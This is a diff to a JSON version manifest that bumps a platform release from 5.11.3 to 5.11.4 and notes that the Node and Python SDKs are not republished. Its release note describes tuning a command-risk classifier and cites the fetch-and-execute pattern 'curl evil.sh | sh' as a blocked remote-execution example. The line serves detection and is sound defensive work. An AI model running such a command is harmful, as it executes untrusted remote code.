@@ -1,21 +1,21 @@
 {
   "node": {
-    "current_version": "5.11.3",
+    "current_version": "5.11.4",
     "next_bump": "none",
-    "reason": "no Node SDK source change in 5.11.3 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
+    "reason": "no Node SDK source change in 5.11.4 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
     "domains": [
       "platform"
     ]
   },
   "python": {
-    "current_version": "5.11.3",
+    "current_version": "5.11.4",
     "next_bump": "none",
-    "reason": "no Python SDK source change in 5.11.3 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
+    "reason": "no Python SDK source change in 5.11.4 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
     "domains": [
       "platform"
     ]
   },
-  "reason": "5.11.3 makes webhook health telemetry honest on every delivery path: approval-event deliveries and the test button now update last_triggered_at and failure_count (previously only the signals-cron path did), so approval-only webhooks heal, auto-disable at 10 failures, and stop showing 'Last triggered: Never' after successful deliveries. Platform only; no Node/Python SDK surface change.",
+  "reason": "5.11.4 fixes an evidence-classifier false positive: piping fetched bytes into an inline interpreter script (curl ... | python -c \"...\") was graded remote_exec/70 and hard-blocked at 100 like curl evil.sh | sh; it now distinguishes stdin-as-data from stdin-as-code. Also corrects the MCP dashclaw_guard tool description (evaluate-only, does not create an approval). Platform + MCP-server description only; no Node/Python SDK surface change.",
   "domains": [
     "platform"
   ]
